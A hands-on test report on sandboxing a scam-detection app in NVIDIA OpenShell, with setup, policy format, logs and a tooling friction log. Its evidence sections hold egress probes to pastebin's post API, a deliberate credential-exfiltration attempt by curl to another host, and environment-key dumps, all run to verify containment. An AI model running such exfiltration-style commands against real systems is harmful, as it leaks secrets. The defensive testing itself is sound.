# Running Jaga inside NVIDIA OpenShell: what we ran and what happened

Tested 2026-10-16 in a Linux x86_64 cloud container (Ubuntu 24.04, Docker 29.8,
running as root). OpenShell gateway 0.1.4 (`ghcr.io/nvidia/openshell/gateway:latest`),
Docker compute driver, Python SDK `openshell==0.1.4`. Total time: about 15 minutes
from a cold start to the first sandboxed verdict, plus about 5 minutes making the
setup script reproducible.

## Result

| Claim | Status | Evidence |
|---|---|---|
| A real Jaga case runs inside an OpenShell sandbox (live Nemotron on Nebius Token Factory and live Tavily, not mock) | **Works** | [A](#a-sandboxed-jaga-case) |
| Default-deny egress: only the 3 allowlisted hosts are reachable | **Works** for the hosts we tested (`example.com`, `pastebin.com` denied; Token Factory and Tavily allowed) | [B](#b-blocked-request) |
| API keys are hidden from the sandbox (placeholder + proxy rewrite) | **Works** for `NEBIUS_API_KEY` and `TAVILY_API_KEY` | [C](#c-credentials-hidden) |
| A key cannot be sent to a different allowlisted host | **Works** (403 `credential_endpoint_mismatch`) | [C](#c-credentials-hidden) |
| Filesystem confinement | **Probably works.** `/var` and `/home/app` were unreadable and `/data` was writable, which is what Landlock would do, but no Landlock log line appeared to confirm it | [D](#d-filesystem) |
| Telegram through the sandbox | **Not tested.** `api.telegram.org` is in the allowlist, but the bot token is not managed by a provider: it goes in the URL path and would need a profile with `path_template` | |
| NemoClaw / `nemohermes` (Hermes Agent onboarding) | **Not tested and not available.** See the friction log | |
| `openshell` CLI | **Not used.** Release downloads were blocked here, so everything goes through the Python SDK and raw gRPC | |

**Claim the README can make, in one sentence:**
"Jaga's case pipeline runs inside an NVIDIA OpenShell 0.1.4 sandbox under a default-deny egress policy that allows only Nebius Token Factory, Tavily and Telegram. The Nebius and Tavily API keys stay in the OpenShell gateway, so the sandbox only ever sees placeholders, and the proxy injects the real key only for its own host (tested; the NemoClaw/Hermes onboarding and Telegram paths are not yet run under OpenShell)."

## Exact commands that worked

Everything is scripted in `hermes/setup_nemohermes.sh` (run it from the repo root). It
ran end to end on the second gateway instance:

```bash
pip install openshell==0.1.4 pyyaml
# EXTRA_CA_BUNDLE is only needed behind a TLS-intercepting egress proxy (our cloud box had one)
EXTRA_CA_BUNDLE=/root/.ccr/ca-bundle.crt bash hermes/setup_nemohermes.sh
```

What the script does:

1. **Gateway.** It downloads `deploy/docker/docker-compose.yml` and `gateway.toml` from
   NVIDIA/OpenShell `main` and runs `docker compose up -d --force-recreate`. That gives a
   plaintext gRPC gateway on `127.0.0.1:8080` with the Docker driver and an `init` job that
   generates the JWT keys. Behind an intercepting proxy, it first builds
   `jaga-supervisor:local`, which is the supervisor image plus the proxy CA in
   `/etc/ssl/certs/ca-certificates.crt`, and points `supervisor_image` at it.
2. **Sandbox image.** It builds `jaga-sandbox:local` from `nvcr.io/nvidia/base/ubuntu:24.04`:
   python3 in a venv at `/opt/venv`, Jaga at `/opt/jaga`, `USER app` (uid 1500),
   writable `/sandbox` and `/data`, and iproute2 and nftables. **No `.env` in the image.**
3. **Provider profiles and providers.** It calls `ImportProviderProfiles` for two custom
   profiles:
   - `nebius-token-factory`: env `NEBIUS_API_KEY`, bearer `authorization`, endpoint
     `api.tokenfactory.nebius.com:443`, rest, read-write, enforce.
   - `tavily`: the same shape for `TAVILY_API_KEY` and `api.tavily.com`.

   It then calls `CreateProvider` for `jaga-nebius-token-factory` and `jaga-tavily`, with
   values read from `.env` on the host. **`profile_workspace="default"` is required.**
4. **Sandbox.** It calls `CreateSandbox` with:
   - `template.image=jaga-sandbox:local`
   - `policy=<hermes/openshell-policy.yaml mapped to the SandboxPolicy proto>`
   - `providers=[jaga-nebius-token-factory, jaga-tavily]`
   - `command=[sleep, infinity]`

   It then runs the smoke tests with `SandboxClient.exec`.

On a re-run, the profile import and provider create calls return `ALREADY_EXISTS`. That is
expected and harmless. A fresh profile import was tested separately with the same code.

Supervisor (OCSF) log: `docker logs $(docker ps --format '{{.Names}}' | grep -- '-supervisor$')`

### The real policy format

The real format is in `hermes/openshell-policy.yaml`. The earlier draft
(`apiVersion/kind/spec.network.defaultAction/egress/inference/audit`) does not exist in
OpenShell. The real top-level keys are `version: 1`, `filesystem_policy`, `landlock`,
`process`, `network_policies` and `network_middlewares`. Each `network_policies.<name>` has
`endpoints[]` (`host`, `port`, `protocol`, `access`, `enforcement`, `tls`, ...) and
`binaries[]` (`path`). Deny is implicit. Inference routing and keys are not part of the
policy; they come from **providers**.

```yaml
version: 1
filesystem_policy: {include_workdir: true, read_only: [/usr, /lib, /etc, /opt, ...], read_write: [/sandbox, /data, /tmp, /dev/null]}
landlock: {compatibility: best_effort}
process: {run_as_user: "1500", run_as_group: "1500"}
network_policies:
  nebius_token_factory:
    endpoints: [{host: api.tokenfactory.nebius.com, port: 443, protocol: rest, access: read-write, enforcement: enforce}]
    binaries: [{path: /usr/bin/python3.12}, {path: /usr/bin/curl}]
  tavily:   {...api.tavily.com...}
  telegram: {...api.telegram.org...}
```

Two notes on the format:

- The binary must be the **resolved** interpreter (`/usr/bin/python3.12`), not the venv
  symlink. OCSF logs show `/usr/bin/python3.12(0) -> ...`.
- After the providers were attached, the traffic matched the provider-contributed
  `_provider_jaga_nebius_token_factory` and `_provider_jaga_tavily` rules rather than our
  named rules.

## Evidence (trimmed terminal output)

`run.py exec jaga -- <cmd>` / `exec jaga -- <cmd>` below is a 60-line local helper wrapping
`SandboxClient("127.0.0.1:8080").exec("jaga", cmd, workspace="default")` (same calls as the script).

### A. Sandboxed Jaga case

This run used hidden keys. Only placeholders are inside the sandbox.

```
$ python3 run.py exec jaga -- python3 -c "...Jaga().run_case('Pos Laju: bungkusan ditahan, bayar RM48 di poslaju-kastam.xyz', RunOptions(household_id='os', notify=False))..."
MOCK= False | key in sandbox starts with: openshell:resolve:
VERDICT high parcel
secs 22.4
[exit_code=0]

# result metadata from a second identical run (proves live models, not mock):
'models_used': {'fast': 'nvidia/Nemotron-3_5-Lightning', 'plan': 'nvidia/nemotron-3-super-120b-a12b'},
'usage': {'prompt_tokens': 2502, 'completion_tokens': 2249}, 'cost_usd': 0.002577, 'latency_ms': 21543
```

Supervisor OCSF log for that case:

```
OCSF NET:OPEN  [INFO] ALLOWED /usr/bin/python3.12(0) -> api.tokenfactory.nebius.com:443 [policy:_provider_jaga_nebius_token_factory engine:opa]
OCSF HTTP:POST [INFO] ALLOWED POST http://api.tokenfactory.nebius.com:443/v1/chat/completions [policy:_provider_jaga_nebius_token_factory engine:l7]
OCSF NET:OPEN  [INFO] ALLOWED /usr/bin/python3.12(0) -> api.tavily.com:443 [policy:_provider_jaga_tavily engine:opa]
OCSF HTTP:POST [INFO] ALLOWED POST http://api.tavily.com:443/search [policy:_provider_jaga_tavily engine:l7]
OCSF HTTP:POST [INFO] ALLOWED POST http://api.tokenfactory.nebius.com:443/v1/chat/completions [policy:_provider_jaga_nebius_token_factory engine:l7]
```

### B. Blocked request

```
$ exec jaga -- curl -sS -m 15 https://example.com
curl: (7) Failed to connect to example.com port 443 after 3 ms: Couldn't connect to server
[exit_code=7]

$ exec jaga -- python3 -c "httpx.get(u) for u in [example.com, pastebin.com/api/api_post.php, api.tavily.com]"
https://example.com BLOCKED ConnectError [Errno 13] Permission denied
https://pastebin.com/api/api_post.php BLOCKED ConnectError [Errno 13] Permission denied
https://api.tavily.com 200

# supervisor:
OCSF NET:REFUSE [MED] DENIED example.com [reason:policy_dns_ineligible]
OCSF NET:OPEN   [MED] DENIED /usr/bin/python3.12(0) -> example.com:443 [reason:transparent_tcp_policy_denied]
OCSF NET:REFUSE [MED] DENIED pastebin.com [reason:policy_dns_ineligible]
OCSF NET:OPEN   [MED] DENIED /usr/bin/python3.12(0) -> pastebin.com:443 [reason:transparent_tcp_policy_denied]
```

### C. Credentials hidden

```
$ exec jaga -- sh -c 'printenv NEBIUS_API_KEY; printenv TAVILY_API_KEY'   (values classified, not printed raw)
NEBIUS_API_KEY = openshell:resolve:env:v17525974590403200398_NEBIUS_API_KEY
TAVILY_API_KEY = openshell:resolve:env:v17525974590403200398_TAVILY_API_KEY

$ exec jaga -- sh -c 'curl -H "Authorization: Bearer $NEBIUS_API_KEY" https://api.tokenfactory.nebius.com/v1/models'
nebius /v1/models with placeholder: 200          <- proxy swapped placeholder for the real key

# exfil attempt: send the Nebius placeholder to another *allowlisted* host
$ exec jaga -- sh -c 'curl -H "Authorization: Bearer $NEBIUS_API_KEY" https://api.telegram.org/bot123/getMe'
{"error":"credential_endpoint_mismatch","message":"Credential is not authorized for this request endpoint"}  [http 403]
```

An earlier run injected the real keys as sandbox env vars (`SandboxSpec.environment`). It
also produced `VERDICT high parcel`, but that version leaks the keys to the workload. The
provider version above replaces it.

### D. Filesystem

```
$ exec jaga -- sh -c 'touch /opt/x; touch /data/ok && echo data-writable; ls /var; ls /home/app'
touch: cannot touch '/opt/x': Permission denied
data-writable
var-NOT-readable
home-NOT-readable
```

`/var` and `/home/app` should normally be readable, so the path allowlist does seem to be
enforced. However, the supervisor log only shows `Enriched policy with baseline filesystem
paths`. We did not see a `Landlock ruleset built` line, so we are not claiming Landlock
specifically.

## Friction log (for the hackathon tool-feedback section)

Timings are wall-clock minutes. The whole run took about 20 minutes, so there is no single
huge sink. The items are listed by how much they would cost a newcomer.

1. **No CLI reachable; the SDK cannot load a policy file.** (~3 min, and it would be more
   for a newcomer.) `install.sh` and every doc example need `github.com/NVIDIA/OpenShell/releases/...`,
   which returned `403` in our sandboxed CI-like box. `ghcr.io` images worked. PyPI
   `openshell` is the SDK only and has no `openshell` binary. There is no `openshell/cli`
   container image to fall back on.

   The Python SDK takes a `SandboxPolicy` **protobuf**. It has no `load_policy_yaml()`, so
   we wrote our own YAML-to-proto mapper. The YAML key `filesystem_policy` maps to the proto
   field `filesystem`, and `access: read-write` has to become the enum
   `NETWORK_ACCESS_PRESET_READ_WRITE`. Suggestions: ship `openshell.policy.from_yaml()` in
   the SDK, and publish a `ghcr.io/nvidia/openshell/cli` image.
2. **The SDK has no provider or profile API.** `openshell.ProviderClient` only has
   `get_credentials()`, so creating a profile or a provider means using the private
   `client._stub` with `ImportProviderProfiles` and `CreateProvider`.
3. **`CreateProvider` fails right after a successful workspace-scoped profile import.**
   (~2 min.) The error was `INVALID_ARGUMENT: provider profile 'nebius-token-factory' was not
   found in the requested scope; import a matching profile before creating this provider`,
   immediately after `ImportProviderProfiles(workspace_scope=default)` succeeded. A second
   import attempt said `custom provider profile 'nebius-token-factory' already exists`, so
   the profile was there. The fix was to set `Provider.profile_workspace="default"`. The
   error message should say that, or the field should default to the request's workspace.
4. **The draft policy schema was entirely wrong.** (~3 min to find the real schema in
   `docs/how-it-works/policies/schema.mdx`.) Searching the web or guessing from blogs gives
   k8s-style `apiVersion/kind/spec.network.defaultAction/egress` YAML. The real schema is
   `version: 1` plus a `network_policies` map, deny is implicit, and keys and inference
   routing live in providers rather than the policy. A short "Coming from k8s
   NetworkPolicy?" note would help.
5. **TLS-intercepting egress proxy plus a Docker driver without `additional_ca_bundle`.**
   (~4 min, the biggest technical blocker.) With L7 inspection, the supervisor's upstream
   TLS failed silently from the workload's point of view: `curl: (52) Empty reply from
   server`, and the log only said `OCSF NET:FAIL [LOW] api.tokenfactory.nebius.com:443`.
   There was no TLS error text or reason. Switching to `tls: skip` got further, but then the
   workload failed with `curl: (60) self-signed certificate in certificate chain`, because
   OpenShell overrides `SSL_CERT_FILE`/`CURL_CA_BUNDLE` with its own bundle
   (`/run/openshell-supervisor-ca/material/ca-bundle.crt`, built from the **supervisor**
   image's CA store and not the workload image's).

   `additional_ca_bundle` exists, but it is **Podman-only**; the Docker driver only has
   `proxy_ca_bundle`, which requires `https_proxy`. Our workaround was a two-line derived
   supervisor image with the CA appended to `/etc/ssl/certs/ca-certificates.crt`, plus
   `supervisor_image = "jaga-supervisor:local"`. Suggestions: add `additional_ca_bundle` to
   the Docker driver, and put the TLS error into `NET:FAIL` events.
6. **The gateway pins `supervisor_image` to an image ID at startup.** (~2 min.) We rebuilt
   `jaga-supervisor:local` while the gateway was running. The next sandbox went to the
   `Error` phase with `ControlSupervisorStartFailed create Docker supervisor staging
   container: Docker responded with status code 404: No such image: sha256:71df...`. The
   SDK only raised `SandboxError: sandbox jaga entered error phase`, with no reason. The fix
   was `docker compose up -d --force-recreate`. Suggestion: re-resolve the tag on 404, and
   include the condition reason in the SDK exception.
7. **The gateway is not ready right after `compose up`.** The first gRPC call failed with
   `UNAVAILABLE ... 127.0.0.1:8080: recvmsg:Connection reset by peer`. We added a
   `health()` retry loop. A `compose` healthcheck on the gateway service would fix this.
8. **The Docker Quick Start in `container-deployment.mdx` differs from
   `deploy/docker/docker-compose.yml`.** The Quick Start (`docker run ...
   OPENSHELL_DOCKER_SUPERVISOR_BIN`) does not mention that the Docker driver needs the JWT
   signing keys. Only the Compose section says "The Docker driver requires them". We used
   the Compose files, which worked first time.
9. **Binary matching uses the resolved interpreter.** The venv path `/opt/venv/bin/python3`
   is logged and matched as `/usr/bin/python3.12`. That is reasonable, but the schema docs
   do not say so, and a policy listing the venv path would silently deny.
10. **Logging nits.**
    - OCSF HTTP events print `http://api.tokenfactory.nebius.com:443/...` for what is
      HTTPS traffic, which looks like a plaintext leak at first glance.
    - Once providers are attached, the hits are attributed to `_provider_*` rules and not
      to the user's named rules for the same host. That is fine, but it should be
      documented.
11. **NemoClaw / `nemohermes` is unobtainable from package registries.** `pip download
    nemoclaw` gives `nemoclaw-0.0.0a1`, which is an empty `__init__.py` with no entry
    points (uploaded 2026-03-10). npm `nemoclaw@0.1.0` has no `bin` and its maintainer is
    unrelated. Neither provides `nemohermes`, so the Hermes onboarding path
    (`nemohermes onboard / inference set / start`) was **not tested**. These look like
    name-squats or placeholders and could mislead users.
12. **Docker Hub rate limit.** `curlimages/curl` gave `429 Too Many Requests`. This is
    environmental, not OpenShell's fault, but every OpenShell image we needed was on
    `ghcr.io`/`nvcr.io`, which was a pleasant contrast.

What was pleasantly good:

- Sandbox creation took 0–2 s.
- Default-deny worked out of the box, with clear OCSF `DENIED ... [reason:...]` lines.
- Per-binary attribution in the logs.
- The placeholder-and-rewrite credential model worked first try once the TLS trust issue
  was fixed.
- `credential_endpoint_mismatch` is a genuinely strong anti-exfiltration control.

## Teardown

```bash
docker compose -f "$HOME/.jaga-openshell/gw/docker-compose.yml" down
docker ps -a --format '{{.Names}}' | grep '^openshell-default--jaga-' | xargs -r docker rm -f
# gateway state (providers hold the real keys!) lives in /var/lib/openshell — delete it when done:
sudo rm -rf /var/lib/openshell
```
